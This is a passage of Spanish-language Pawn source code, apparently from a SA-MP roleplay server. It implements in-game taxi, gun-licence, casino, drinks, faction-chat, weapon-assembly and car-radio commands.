			Float:ptY,
			Float:ptZ;

	    if(!jobDuty[playerid] || PlayerInfo[playerid][pJob] != JOB_TAXI) return 1;
        if(TaxiCallTime[playerid] > 0) {
            SendClientMessage(playerid, COLOR_GREY, "�Ya has aceptado una llamada!");
		    return 1;
        }
        if(TaxiCall < 999) {
            if(IsPlayerConnected(TaxiCall)) {
            	SendClientMessage(playerid, COLOR_WHITE, "has aceptado la llamada, ver�s un marcador en el GPS.");
				SendClientMessage(TaxiCall, COLOR_WHITE, "* Un taxista ha aceptado tu llamada, espere en el lugar por favor.");
				TaxiCallTime[playerid] = 1;
				TaxiAccepted[playerid] = TaxiCall;
				GetPlayerPos(TaxiCall, ptX, ptY, ptZ);
				SetPlayerCheckpoint(playerid, ptX, ptY, ptZ, 5);
				TaxiCall = 999;
				return 1;
			}
        } else {
            SendClientMessage(playerid, COLOR_YELLOW2, "�Nadie ha llamado a un taxi!");
	    	return 1;
        }

	} else if(strcmp(text,"picada",true) == 0){
	
		startSprintRaceChallenge(playerid); // sistema de picadas
		return 1;
	} 
	return 1;
}

CMD:cancelar(playerid,params[])
{
	new text[128];

	if(sscanf(params, "s[64]", text))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /cancelar [comando]");

	if(strcmp(text,"mecanico",true) == 0) {
		if(IsPlayerConnected(MechanicCall)) {
			if(MechanicCall == playerid) {
				MechanicCall = 999;
			} else {
				SendClientMessage(playerid, COLOR_YELLOW2, "�No has solicitado un mec�nico!");
				return 1;
			}
		}
		
	} else if(strcmp(text, "vehiculo", true) == 0) {
        if(VehicleOffer[playerid] == INVALID_PLAYER_ID)
            return SendClientMessage(playerid, COLOR_YELLOW2, "Nadie te ha ofrecido un veh�culo.");
		KillTimer(GetPVarInt(playerid, "CancelVehicleTransfer"));
		CancelVehicleTransfer(playerid, 0);
		
	} else if(strcmp(text,"taxi",true) == 0) {
	    if(TaxiCall < 999) {
	        if(jobDuty[playerid] && PlayerInfo[playerid][pJob] == JOB_TAXI && TaxiCallTime[playerid] > 0) {
	            TaxiAccepted[playerid] = 999;
				GameTextForPlayer(playerid, "~w~Has~n~~r~cancelado la llamada", 5000, 1);
				TaxiCallTime[playerid] = 0;
    			DisablePlayerCheckpoint(playerid);
				TaxiCall = 999;
	        } else {
				if(IsPlayerConnected(TaxiCall)) {
					if(TaxiCall == playerid) {
						TaxiCall = 999;
					}
				}
				foreach(new i : Player) {
			        if(TaxiAccepted[i] == playerid) {
			            TaxiAccepted[i] = 999;
			            GameTextForPlayer(i, "~w~Han~n~~r~cancelado la llamada", 5000, 1);
			            TaxiCallTime[i] = 0;
               			DisablePlayerCheckpoint(i);
			        }
				}
			}
		}
	}
	return 1;
}

CMD:darlicencia(playerid, params[])
{
	new targetid;
	
	if(PlayerInfo[playerid][pFaction] != FAC_PMA || PlayerInfo[playerid][pRank] != 1)
	    return 1;
	if(sscanf(params, "d", targetid))
  		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /darlicencia [ID/Jugador]");
	if(GetPlayerBuilding(playerid) != BLD_PMA)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en la comisar�a.");
	if(!ProxDetectorS(4.0, playerid, targetid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido o se encuentra muy lejos.");
	if(PlayerInfo[targetid][pLevel] < 5)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El jugador no posee el tiempo de residencia en el pais necesario ((NIVEL 5)).");
  	if(PlayerInfo[targetid][pWepLic] != 0)
  	    return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto ya cuenta con una licencia de armas.");
	if(GetPlayerCash(targetid) < PRICE_LIC_GUN)
	{
	    SendFMessage(playerid, COLOR_YELLOW2, "El sujeto no cuenta con el dinero suficiente ($%d).", PRICE_LIC_GUN);
	    return 1;
	}

	wepLicOffer[targetid] = playerid;
	SendFMessage(playerid, COLOR_LIGHTBLUE, "Le has ofrecido una licencia de armas a %s, espera su respuesta.", GetPlayerNameEx(targetid));
	SendFMessage(targetid, COLOR_LIGHTBLUE, "%s te ha ofrecido una licencia de armas por %d. Usa /aceptarlicencia si la quieres.", GetPlayerNameEx(playerid), PRICE_LIC_GUN);
	return 1;
}

CMD:aceptarlicencia(playerid, params[])
{
	new offer = wepLicOffer[playerid];
	
	if(offer == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Nadie te ha ofrecido una licencia de armas.");
	if(!IsPlayerConnected(offer))
	{
	    wepLicOffer[playerid] = INVALID_PLAYER_ID;
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El jugador se ha desconectado.");
	}
	if(!ProxDetectorS(4.0, playerid, offer))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido o se encuentra muy lejos.");
	if(GetPlayerCash(playerid) < PRICE_LIC_GUN)
	{
	    SendFMessage(playerid, COLOR_YELLOW2, "No cuentas con el dinero suficiente ($%d).", PRICE_LIC_GUN);
	    return 1;
	}

    GivePlayerCash(playerid, -PRICE_LIC_GUN);
    PlayerInfo[playerid][pWepLic] = 1;
    GiveFactionMoney(FAC_GOB, PRICE_LIC_GUN);
    wepLicOffer[playerid] = INVALID_PLAYER_ID;
    SendClientMessage(playerid, COLOR_WHITE, "�Felicidades! has conseguido una licencia de armas. Ahora puedes comprar un arma en cualquier armer�a.");
    SendFMessage(offer, COLOR_WHITE, "Le has dado una licencia de armas a %s por %d. El dinero se recaudar� para el fondo de facci�n.", GetPlayerNameEx(playerid), PRICE_LIC_GUN);
    return 1;
}
    
/*CMD:intentar(playerid, params[])
{
	new succeed = random(2),
	    string[128];
	    
	if(sscanf(params, "s[128]", string))
		return SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /intentar [texto]");

	if(succeed == 0)
	{
		format(string, sizeof(string), "[Intentar] %s intent� %s y tuvo �xito.", GetPlayerNameEx(playerid), string);
		ProxDetector(15.0, playerid, string, COLOR_ACT1, COLOR_ACT2, COLOR_ACT3, COLOR_ACT4, COLOR_ACT5);
	} else if(succeed == 1)
		{
			format(string, sizeof(string), "[Intentar] %s intent� %s y fall�.", GetPlayerNameEx(playerid), string);
			ProxDetector(15.0, playerid, string, COLOR_ACT1, COLOR_ACT2, COLOR_ACT3, COLOR_ACT4, COLOR_ACT5);
		}
	return 1;
}*/

CMD:moneda(playerid, params[])
{
	new coin = random(2),
	    string[128];
    if(GetPlayerCash(playerid) < 1)
        return SendClientMessage (playerid, COLOR_YELLOW2, "�C�mo pretendes tirar una moneda si no tienes dinero?");
	if(coin == 0)
	{
		format(string, sizeof(string), "[Moneda] %s tir� una moneda y sali� cruz.", GetPlayerNameEx(playerid) );
		ProxDetector(10.0, playerid, string, COLOR_DO1, COLOR_DO2, COLOR_DO3, COLOR_DO4, COLOR_DO5);
	}
	else
	{
		format(string, sizeof(string), "[Moneda] %s tir� una moneda y sali� cara.", GetPlayerNameEx(playerid) );
		ProxDetector(10.0, playerid, string, COLOR_DO1, COLOR_DO2, COLOR_DO3, COLOR_DO4, COLOR_DO5);
	}
	return 1;
}

CMD:dado(playerid, params[])
{
	new dice = random(6),
	    string[128];
    format(string, sizeof(string), "[Dado] %s lanz� un dado y sali� el %d.", GetPlayerNameEx(playerid), dice + 1);
    ProxDetector(10.0, playerid, string, COLOR_DO1, COLOR_DO2, COLOR_DO3, COLOR_DO4, COLOR_DO5);
    return 1;
}

CMD:ventanillas(playerid, params[])
{
	new vehicleid = GetPlayerVehicleID(playerid);
	    
	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un veh�culo para utilizar este comando!");
	if(GetVehicleType(vehicleid) != VTYPE_CAR)
	    return SendClientMessage(playerid, COLOR_YELLOW2,"�Este veh�culo no tiene ventanillas!");
	    
 	if(CarWindowStatus[vehicleid] == 1)
	{
		PlayerActionMessage(playerid, 15.0, "ha abierto las ventanillas del veh�culo.");
		CarWindowStatus[vehicleid] = 0;
  	} else {
		PlayerActionMessage(playerid, 15.0, "ha cerrado las ventanillas del veh�culo.");
		CarWindowStatus[vehicleid] = 1;
	}
	return 1;
}

//=========================NEGOCIOS TIPO CASINO=================================

#define ROULETTE_COLOR_RED    	1
#define ROULETTE_COLOR_BLACK    2
#define ROULETTE_COLOR_GREEN    3
#define CASINO_GAME_ROULETTE    1
#define CASINO_GAME_FORTUNE     2

new rouletteData[37] = {
	3,1,2,1,2,
	1,2,1,2,1,
	2,2,1,2,1,
	2,1,2,1,1,
	2,1,2,1,2,
	1,2,1,2,2,
	1,2,1,2,1,
	2,1
};

getRouletteNumberDozen(number)
{
	if(number >= 1 && number <= 12)
	    return 1;
	else
	    if(number >= 13 && number <= 24)
	        return 2;
		else
		    if(number >= 25 && number <= 36)
	        	return 3;
	return 0;
}

forward CasinoBetEnabled(playerid, game);
public CasinoBetEnabled(playerid, game)
{
	switch(game)
	{
	    case CASINO_GAME_ROULETTE:
			if(isBetingRoulette[playerid])
	    		isBetingRoulette[playerid] = false;
		case CASINO_GAME_FORTUNE:
		    if(isBetingFortune[playerid])
	    		isBetingFortune[playerid] = false;
	}
	return 1;
}

CMD:apostar(playerid, params[])
{
	return SendClientMessage(playerid, COLOR_YELLOW2, "Comandos para apostar en un casino: /apruleta, /apfortuna.");
}
CMD:apruleta(playerid, params[])
{
	for(new i = 0; i < MAX_BUSINESS; i++)
	{
		if(PlayerToPoint(100.0, playerid, Business[i][bInsideX], Business[i][bInsideY], Business[i][bInsideZ]))
		{
			if(GetPlayerVirtualWorld(playerid) == i + 17000)
			{
	    		if(Business[i][bType] == BIZ_CASINO)
	    		{
					new number, numberbet, colour[10], colourbet, dozen, dozenbet;
					if(sscanf(params, "iis[10]iii", number, numberbet, colour, colourbet, dozen, dozenbet))
					{
						SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /apruleta [numero] [apuesta] [rojo/negro] [apuesta] [docena] [apuesta].");
     					SendClientMessage(playerid, COLOR_WHITE, "Si en algun campo no deseas apostar, escribe '-1' en el caso del numero/docena o 'no' en el caso del color, y su apuesta escribe '0'.");
						return 1;
					}
					if(strcmp(colour, "rojo", true) != 0 && strcmp(colour, "negro", true) != 0 && strcmp(colour, "no", true) != 0)
					{
						SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /apruleta [numero] [apuesta] [rojo/negro] [apuesta] [docena] [apuesta].");
     					SendClientMessage(playerid, COLOR_WHITE, "Si en algun campo no deseas apostar, escribe '-1' en el caso del numero/docena o 'no' en el caso del color, y en su apuesta escribe '0'.");
						return 1;
					}
					if(isBetingRoulette[playerid] == true)
					    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes esperar un minuto para volver a apostar!");
					if(number < -1 || number > 36)
					    return SendClientMessage(playerid, COLOR_YELLOW2, "Los numeros de una ruleta van del 0 al 36!");
					if(dozen < -1 || dozen > 3)
					    return SendClientMessage(playerid, COLOR_YELLOW2, "Solo puedes elegir 1ra, 2da o 3er docena! (1,2,3 o -1 para omitir esa apuesta).");
					if(numberbet < 0 || numberbet > 20000 || colourbet < 0 ||colourbet > 20000 || dozenbet < 0 || dozenbet > 20000)
					    return SendClientMessage(playerid, COLOR_YELLOW2, "La apuesta m�nima es de $1 y la m�xima de $20.000!");
					new totalbet = numberbet + colourbet + dozenbet;
					if(GetPlayerCash(playerid) < totalbet)
     					return SendClientMessage(playerid, COLOR_YELLOW2, "No dispones de esa cantidad en efectivo!");
					if( ( numberbet * 36 + colourbet * 2 + dozenbet * 3) > Business[i][bTill] )
					    return SendClientMessage(playerid, COLOR_YELLOW2, "El casino no dispone de tanta liquidez en efectivo en el caso de que ganes. Prueba con otra apuesta.");

	                GivePlayerCash(playerid, -totalbet );
	                Business[i][bTill] += totalbet;

                    new string[128], winnerNumber, winnerColour[10];
					winnerNumber = random(37);
					switch(rouletteData[winnerNumber])
					{
					    case 1: winnerColour = "rojo";
					    case 2: winnerColour = "negro";
					    case 3: winnerColour = "verde";
					}
					format(string, sizeof(string), "apuesta $%d en la ruleta. El croupier empieza a girarla, y tras unos segundos... �%s %d!", totalbet, winnerColour, winnerNumber);
                    PlayerActionMessage(playerid, 15.0, string);

					new betWin = 0;
					new betsWin[128] = "";
					if(winnerNumber == number)
					{
					    betWin += numberbet * 36;
					    format(betsWin, sizeof(betsWin), "N�mero %d, gan� $%d.", winnerNumber, numberbet * 36);
					}
					if(strcmp(winnerColour, colour, true) == 0)
					{
						betWin += colourbet * 2;
						format(betsWin, sizeof(betsWin), "%s Color %s, gan� $%d.", betsWin, winnerColour, colourbet * 2);
					}
					if(getRouletteNumberDozen(winnerNumber) == dozen)
					{
					    betWin += dozenbet * 3;
					    format(betsWin, sizeof(betsWin), "%s Docena N�%d, gan� $%d.", betsWin, dozen, dozenbet * 3);
					}
					if(betWin == 0)
					    PlayerActionMessage(playerid, 15.0, "ha perdido todas sus apuestas: el casino se queda con el dinero.");
					else
					{
					    Business[i][bTill] -= betWin;
					    GivePlayerCash(playerid, betWin);
					    format(string, sizeof(string), "tuvo suerte y gan� $%d! %s", betWin, betsWin);
					    PlayerActionMessage(playerid, 15.0, string);
					}
					isBetingRoulette[playerid] = true;
					SetTimerEx("CasinoBetEnabled", 60000, false, "ii", playerid, CASINO_GAME_ROULETTE);
				}
			}
		}
	}
	return 1;
}

CMD:apfortuna(playerid, params[])
{
 	for(new i = 0; i < MAX_BUSINESS; i++)
	{
		if(PlayerToPoint(100.0, playerid, Business[i][bInsideX], Business[i][bInsideY], Business[i][bInsideZ]))
		{
			if(GetPlayerVirtualWorld(playerid) == i + 17000)
			{
	    		if(Business[i][bType] == BIZ_CASINO)
	    		{
  					new number, numberbet;
   					if(sscanf(params, "ii",number, numberbet))
						return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /apfortuna [numero] [apuesta]");
	    			if(isBetingFortune[playerid] == true)
			    		return SendClientMessage(playerid, COLOR_YELLOW2, "Debes esperar un minuto para volver a apostar!");
					if(number != 1 && number != 2 && number != 5 && number != 10 && number != 20 && number != 40)
					    return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes que apostar por un valor v�lido: 1, 2, 5, 10, 20 o 40.");
					if(numberbet < 1 || numberbet > 20000)
					    return SendClientMessage(playerid, COLOR_YELLOW2, "La apuesta m�nima es de $1 y la m�xima de $20.000!");
					if(GetPlayerCash(playerid) < numberbet)
		     			return SendClientMessage(playerid, COLOR_YELLOW2, "No dispones de esa cantidad en efectivo!");
					if( number * (numberbet + 1)  > Business[i][bTill] )
					    return SendClientMessage(playerid, COLOR_YELLOW2, "El casino no dispone de tanta liquidez en efectivo en el caso de que ganes. Prueba con otra apuesta.");

                    new string[128], winnerNumber;
                    GivePlayerCash(playerid, -numberbet);
                    Business[i][bTill] += numberbet;

                    new aleatorio = random(54);
					if(aleatorio < 24) winnerNumber = 1;
						else if(aleatorio < 39) winnerNumber = 2;
						    else if(aleatorio < 46) winnerNumber = 5;
           						else if(aleatorio < 50) winnerNumber = 10;
   						        	else if(aleatorio < 52) winnerNumber = 20;
   						        	    else if(aleatorio < 54) winnerNumber = 40;

					format(string, sizeof(string), "apuesta $%d al numero %d en la rueda de la fortuna. Luego de girar, se detiene en... �%d!", numberbet, number, winnerNumber);
                    PlayerActionMessage(playerid, 15.0, string);
                    if(winnerNumber == number)
                    {
                        GivePlayerCash(playerid, number * (numberbet + 1));
                    	Business[i][bTill] += number * (numberbet + 1);
                    	format(string, sizeof(string), "ha ganado $%d apostandole al %d!", number * (numberbet + 1), number);
					} else
					    	format(string, sizeof(string), "ha perdido $%d apostandole al %d!", numberbet, number);
       				PlayerActionMessage(playerid, 15.0, string);
					isBetingFortune[playerid] = true;
					SetTimerEx("CasinoBetEnabled", 60000, false, "ii", playerid, CASINO_GAME_FORTUNE);
				}
			}
		}
	}
	return 1;
}

//======================NEGOCIOS TIPO BAR/CASINO/DISCO==========================

PlayerDrinkAlcohol(playerid, alcohol)
{
    DrinksTaken[playerid] += alcohol;
	if(DrinksTaken[playerid] >= 100)
 	{
    	SetPlayerDrunkLevel(playerid, 15000);
		SendClientMessage(playerid, COLOR_WHITE, "Has tomado demasiado y entras en estado de ebriedad");
  		DrinksTaken[playerid] = 0;
  	}
  	if(GetPlayerDrunkLevel(playerid) >= 2000)
  		ApplyAnimation(playerid, "PED", "WALK_drunk", 4.1, 1, 1, 1, 1, 1); //Animaci�n de borracho
}

enum DrinksInfo {
	drName[32],
	drPrice,
	drAmount,
 	drAlcohol
};

static const DrinksMenuBar[][DrinksInfo] = {
	{"Cerveza", 35, 50, 20},
	{"Vodka", 40, 50, 50},
	{"Coca cola", 25, 50, 0},
    {"Agua", 20, 50, 0},
    {"Whisky", 40, 50, 30},
    {"Brandy", 35, 50, 25},
    {"Caf� cortado", 25, 50, 0},
    {"Caf� irland�s", 35, 50, 10}
};

static const DrinksMenuDisco[][DrinksInfo] = {
	{"Fernet cola", 50, 50, 25},
	{"Destornillador", 60, 50, 40},
	{"Gin tonic", 60, 50, 20},
	{"Cuba libre", 70, 50, 30},
	{"Caipirinha", 80, 50, 30},
	{"Martini", 80, 50, 30},
	{"Botella de champagne", 150, 70, 35}
};

ShowDrinksMenuBar(playerid)
{
    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /beber [nro de item]");
	for(new i = 0; i < sizeof(DrinksMenuBar); i++)
		SendFMessage(playerid, COLOR_WHITE, "%d) %s - $%d", i, DrinksMenuBar[i][drName], DrinksMenuBar[i][drPrice]);
	return 1;
}

ShowDrinksMenuDisco(playerid)
{
    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /beber [nro de item]");
	for(new i = 0; i < sizeof(DrinksMenuDisco); i++)
		SendFMessage(playerid, COLOR_WHITE, "%d) %s - $%d", i, DrinksMenuDisco[i][drName], DrinksMenuDisco[i][drPrice]);
	return 1;
}

CMD:beber(playerid, params[])
{
	new drink, str[128];

	if(GetPVarInt(playerid, "disabled") == DISABLE_DYING || GetPVarInt(playerid, "disabled") == DISABLE_DEATHBED)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No puedes hacerlo en este momento.");

	for(new i = 0; i < MAX_BUSINESS; i++)
	{
		if(PlayerToPoint(100.0, playerid, Business[i][bInsideX], Business[i][bInsideY], Business[i][bInsideZ]))
		{
			if(GetPlayerVirtualWorld(playerid) == i + 17000)
			{
	    		if(Business[i][bType] == BIZ_CLUB || Business[i][bType] == BIZ_CASINO)
				{
	    			if(Business[i][bProducts] <= 0)
                    	return SendClientMessage(playerid, COLOR_YELLOW2, "El negocio no tiene stock de bebidas. Intenta volviendo mas tarde");
					if(sscanf(params, "i", drink))
						return ShowDrinksMenuBar(playerid);
					if(drink < 0 || drink >= sizeof(DrinksMenuBar))
					    return SendClientMessage(playerid, COLOR_YELLOW2, "Ingresa una opci�n v�lida.");
					if(GetPlayerCash(playerid) < DrinksMenuBar[drink][drPrice])
					    return SendClientMessage(playerid, COLOR_YELLOW2, "�Vuelve cuando tengas el dinero suficiente!");

					GivePlayerCash(playerid, -DrinksMenuBar[drink][drPrice]);
		            Business[i][bTill] += DrinksMenuBar[drink][drPrice];
		            Business[i][bProducts]--;
		            format(str, sizeof(str), "le pide un/a %s al empleado del negocio.", DrinksMenuBar[drink][drName]);
					PlayerActionMessage(playerid, 15.0, str);
	    			PlayerDrink(playerid, DrinksMenuBar[drink][drAmount]);
		            PlayerDrinkAlcohol(playerid, DrinksMenuBar[drink][drAlcohol]);
					saveBusiness(i);
					return 1;
				}
				else if(Business[i][bType] == BIZ_CLUB2)
				{
	    			if(Business[i][bProducts] <= 0)
                    	return SendClientMessage(playerid, COLOR_YELLOW2, "El negocio no tiene stock de bebidas. Intenta volviendo mas tarde");
					if(sscanf(params, "i", drink))
						return ShowDrinksMenuDisco(playerid);
					if(drink < 0 || drink >= sizeof(DrinksMenuDisco))
					    return SendClientMessage(playerid, COLOR_YELLOW2, "Ingresa una opci�n v�lida.");
					if(GetPlayerCash(playerid) < DrinksMenuDisco[drink][drPrice])
					    return SendClientMessage(playerid, COLOR_YELLOW2, "�Vuelve cuando tengas el dinero suficiente!");

					GivePlayerCash(playerid, -DrinksMenuDisco[drink][drPrice]);
		            Business[i][bTill] += DrinksMenuDisco[drink][drPrice];
		            Business[i][bProducts]--;
		            format(str, sizeof(str), "le pide un/a %s al empleado del negocio.", DrinksMenuDisco[drink][drName]);
					PlayerActionMessage(playerid, 15.0, str);
	    			PlayerDrink(playerid, DrinksMenuDisco[drink][drAmount]);
		            PlayerDrinkAlcohol(playerid, DrinksMenuDisco[drink][drAlcohol]);
					saveBusiness(i);
					return 1;
				}
			}
		}
	}
	return 1;
}

//==============================COMANDOS DE MAFIAS==============================

/*
CMD:ch(playerid, params[]) {
	cmd_chino(playerid, params);
	return 1;
}

CMD:chino(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == FAC_CHIN)
	{
		new text[128];
		if(sscanf(params, "s[128]", text))
			return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/ch)ino [texto]");
		new name[24];
		if(!usingMask[playerid])
		    name = GetPlayerNameEx(playerid);
		else
			name = "Enmascarado";
		foreach(new i : Player)
		{
		    if(ProxDetectorS(15.0, playerid, i))
 			{
		    	if(PlayerInfo[i][pFaction] == FAC_CHIN || AdminDuty[i])
		        	SendFMessage(i, COLOR_WHITE, "%s dice en chino: %s", name, text);
				else
				    SendFMessage(i, COLOR_ACT1, "%s habla unas palabras en un idioma desconocido.", name);
			}
		}
	}
	return 1;
}
*/
CMD:it(playerid, params[]) {
	cmd_italiano(playerid, params);
	return 1;
}

CMD:italiano(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == FAC_FREE_ILLEGAL_MAF_4)
	{
		new text[128];
		if(sscanf(params, "s[128]", text))
			return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/it)aliano [texto]");
		new name[24];
		if(!usingMask[playerid])
		    name = GetPlayerNameEx(playerid);
		else
			name = "Enmascarado";
		foreach(new i : Player)
		{
		    if(ProxDetectorS(15.0, playerid, i))
 			{
		    	if(PlayerInfo[i][pFaction] == FAC_FREE_ILLEGAL_MAF_4 || AdminDuty[i])
		    	    if(!usingMask[playerid])
						SendFMessage(i, COLOR_WHITE, "%s dice en italiano: %s", GetPlayerNameEx(playerid), text);
					else
					    SendFMessage(i, COLOR_WHITE, "Enmascarado %d dice en italiano: %s", maskNumber[playerid], text);
				else
					if(!usingMask[playerid])
		    			SendFMessage(i, COLOR_ACT1, "%s habla unas palabras en un idioma desconocido.", GetPlayerNameEx(playerid));
					else
					    SendFMessage(i, COLOR_ACT1, "Enmascarado %d habla unas palabras en un idioma desconocido.", maskNumber[playerid]);
			}
		}
	}
	return 1;
}
/*
CMD:ru(playerid, params[]) {
	cmd_ruso(playerid, params);
	return 1;
}

CMD:ruso(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == FAC_FORZ)
	{
		new text[128];
		if(sscanf(params, "s[128]", text))
			return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/ru)so [texto]");
		new name[24];
		if(!usingMask[playerid])
		    name = GetPlayerNameEx(playerid);
		else
			name = "Enmascarado";
		foreach(new i : Player)
		{
		    if(ProxDetectorS(15.0, playerid, i))
 			{
		    	if(PlayerInfo[i][pFaction] == FAC_FORZ || AdminDuty[i])
		        	SendFMessage(i, COLOR_WHITE, "%s dice en ruso: %s", name, text);
				else
				    SendFMessage(i, COLOR_ACT1, "%s habla unas palabras en un idioma desconocido.", name);
			}
		}
	}
	return 1;
}
*/

CMD:ensamblar(playerid, params[])
{
	new item, mats, weapon;

	if(PlayerInfo[playerid][pRank] != 1 || PlayerInfo[playerid][pFaction] == FAC_NONE || FactionInfo[PlayerInfo[playerid][pFaction]][fType] != FAC_TYPE_ILLEGAL)
		return 1;
    if(Building[GetPlayerBuilding(playerid)][blFaction] != PlayerInfo[playerid][pFaction])
        return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar dentro de tu HQ.");
	if(sscanf(params, "d", item))
	{
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /ensamblar [item]");
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 1  - 9mm.             | %d piezas", MATS_9MM);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 2  - 9mm c/sil.      | %d piezas", MATS_S9MM);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 3  - Desert Eagle  | %d piezas", MATS_DEAGLE);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 4  - Escopeta        | %d piezas", MATS_SHOTGUN);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 5  - Uzi                 | %d piezas", MATS_UZI);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 6  - MP-5              | %d piezas", MATS_MP5);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 7  - AK-47             | %d piezas", MATS_AK47);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 8  - M-4                | %d piezas", MATS_M4);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 9 - TEC-9            | %d piezas", MATS_TEC9);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 10 - Rifle              | %d piezas", MATS_CRIFLE);
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 11 - Rifle Sniper  | %d piezas", MATS_SRIFLE);
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Al ensamblar un arma de fuego �sta traer� 50 municiones, en caso de granadas o armas blancas ser� por unidad.");
		return 1;
	}
	if(item < 1 || item > 11)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "N�mero de item incorrecto, solo puedes del 1 al 11.");

 	switch(item)
	 {
		case 1: { weapon = 22; mats = MATS_9MM; }
		case 2: { weapon = 23; mats = MATS_S9MM; }
		case 3: { weapon = 24; mats = MATS_DEAGLE; }
		case 4: { weapon = 25; mats = MATS_SHOTGUN; }
		case 5: { weapon = 28; mats = MATS_UZI; }
		case 6: { weapon = 29; mats = MATS_MP5; }
		case 7: { weapon = 30; mats = MATS_AK47; }
		case 8: { weapon = 31; mats = MATS_M4; }
		case 9: { weapon = 32; mats = MATS_TEC9; }
		case 10: { weapon = 33; mats = MATS_CRIFLE; }
		case 11: { weapon = 34; mats = MATS_SRIFLE; }
	}
 	if(FactionInfo[PlayerInfo[playerid][pFaction]][fMaterials] < mats)
        SendFMessage(playerid, COLOR_YELLOW2, "Tu facci�n no cuenta con los materiales suficientes, necesitas %d piezas como m�nimo y tienes %d.", mats, FactionInfo[PlayerInfo[playerid][pFaction]][fMaterials]);
	else
	{
		if(!GivePlayerGun(playerid, weapon, 50))
			return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes c�mo agarrar el arma ya que tienes ambas manos ocupadas.");
		FactionInfo[PlayerInfo[playerid][pFaction]][fMaterials] -= mats;
		SendFMessage(playerid, COLOR_WHITE, "Has ensamblado un/a %s con 50 municiones por %d piezas.", GetItemName(weapon), mats);
	}
	return 1;
}

//==========================SISTEMA DE RADIO PARA AUTOS=========================

stock PlayRadioStreamForPlayer(playerid, radio)
{
	if(hearingRadioStream[playerid])
 		StopAudioStreamForPlayer(playerid);
	switch(radio)
	{
	    case 0: return 1;
	    case 1: PlayAudioStreamForPlayer(playerid, "http://buecrplb01.cienradios.com.ar/Mitre790.mp3");
	    case 2: PlayAudioStreamForPlayer(playerid, "http://pub8.sky.fm/sky_classicrap?26d5dea1edd974aa0d4b8d94"); //nueva
	    case 3: PlayAudioStreamForPlayer(playerid, "http://pub8.sky.fm/sky_modernrock?26d5dea1edd974aa0d4b8d94"); //nueva
	    case 4: PlayAudioStreamForPlayer(playerid, "http://movidamix.com:8128/listen.pls");
	    case 5: PlayAudioStreamForPlayer(playerid, "http://buecrplb01.cienradios.com.ar/Palermo_2.mp3");
	    case 6: PlayAudioStreamForPlayer(playerid, "http://buecrplb01.cienradios.com.ar/fm979.mp3");
	    case 7: PlayAudioStreamForPlayer(playerid, "http://buecrplb01.cienradios.com.ar/la100_mdq.mp3");
	    case 8: PlayAudioStreamForPlayer(playerid, "http://pub3.sky.fm/sky_bossanova?26d5dea1edd974aa0d4b8d94"); //nueva
	    case 9: PlayAudioStreamForPlayer(playerid, "http://pub2.sky.fm/sky_tophits?26d5dea1edd974aa0d4b8d94"); //nueva
     	case 10: PlayAudioStreamForPlayer(playerid, "http://stream.electroradio.ch:26630"); //nueva
     	case 11: PlayAudioStreamForPlayer(playerid, "http://95.141.24.173:80/listen.pls");
	    case 12: PlayAudioStreamForPlayer(playerid, "http://pub3.sky.fm:80/sky_modernblues?26d5dea1edd974aa0d4b8d94"); // nueva
	    case 13: PlayAudioStreamForPlayer(playerid, "http://serverstreamgroup.biz:8112/stream?type=.fl"); //nueva
	    case 14: PlayAudioStreamForPlayer(playerid, "http://streaming.radionomy.com/CUMBIAPARATODOSyCADENAMIX?type=flash"); //nueva
	    case 15: PlayAudioStreamForPlayer(playerid, "http://streaming.radionomy.com/CTRMAN");//radio CTR
	    case 16: PlayAudioStreamForPlayer(playerid, "http://streaming.radionomy.com/MIXLA128KB");//juance
	}
